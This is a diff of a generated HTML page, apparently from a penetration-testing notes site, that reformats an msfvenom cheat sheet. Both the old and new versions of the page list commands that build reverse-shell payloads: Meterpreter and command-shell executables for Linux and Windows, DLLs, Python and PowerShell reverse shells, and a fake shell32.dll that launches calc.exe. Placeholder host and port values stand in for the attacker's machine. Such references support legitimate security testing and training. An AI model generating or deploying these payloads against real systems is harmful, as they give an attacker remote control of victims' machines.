@@ -7602,38 +7602,38 @@
   <h1>Msfvenom</h1>
 
 <p>Executable formats</p>
-<pre><code>asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
+</span></code></pre></div>
 <p>Transform formats</p>
-<pre><code>bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
-</code></pre>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
+</span></code></pre></div>
 <p>Staged Meterpreter</p>
-<pre><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f elf &gt; shell-meterp.elf
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>YourIP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>YourPort<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>&gt;<span class="w"> </span>shell-meterp.elf
+</span></code></pre></div>
 <p>Inline Meterpreter</p>
-<pre><code class="language-bash">msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f elf &gt; santas.elf
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>YourIP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>YourPort<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>&gt;<span class="w"> </span>santas.elf
+</span></code></pre></div>
 <p>Executable with Meterpreter</p>
-<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe &gt; shell-meterp.exe
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>YourIP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>YourPort<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>shell-meterp.exe
+</span></code></pre></div>
 <p>Executable with Windows cmd</p>
-<pre><code class="language-bash">msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe &gt; shell-cmd.exe
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>YourIP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>YourPort<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>shell-cmd.exe
+</span></code></pre></div>
 <p>Windows DLL with Windows cmd</p>
-<pre><code class="language-bash">msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f dll &gt; shell-cmd.dll
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>YourIP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>YourPort<span class="w"> </span>-f<span class="w"> </span>dll<span class="w"> </span>&gt;<span class="w"> </span>shell-cmd.dll
+</span></code></pre></div>
 <p>Execute Windows Command - génère une dll shell32.dll qui lance calc.exe</p>
-<pre><code class="language-bash">msfvenom -f dll -p windows/exec CMD=&quot;C:\windows\system32\calc.exe&quot; -o shell32.dll
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>msfvenom<span class="w"> </span>-f<span class="w"> </span>dll<span class="w"> </span>-p<span class="w"> </span>windows/exec<span class="w"> </span><span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;C:\windows\system32\calc.exe&quot;</span><span class="w"> </span>-o<span class="w"> </span>shell32.dll
+</span></code></pre></div>
 <p>Python</p>
-<pre><code class="language-bash">msfvenom -p cmd/unix/reverse_python LHOST=YourIP LPORT=YourPort -f raw
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>cmd/unix/reverse_python<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>YourIP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>YourPort<span class="w"> </span>-f<span class="w"> </span>raw
+</span></code></pre></div>
 <p>Powershell</p>
-<pre><code class="language-bash">msfvenom -p windows/powershell_reverse_tcp LHOST=YourIP LPORT=YourPort -f raw
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/powershell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>YourIP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>YourPort<span class="w"> </span>-f<span class="w"> </span>raw
+</span></code></pre></div>
 <p>List encoders</p>
-<pre><code class="language-bash">msfvenom -l encoders
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>msfvenom<span class="w"> </span>-l<span class="w"> </span>encoders
+</span></code></pre></div>
 
 
 
@@ -7680,7 +7680,7 @@
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
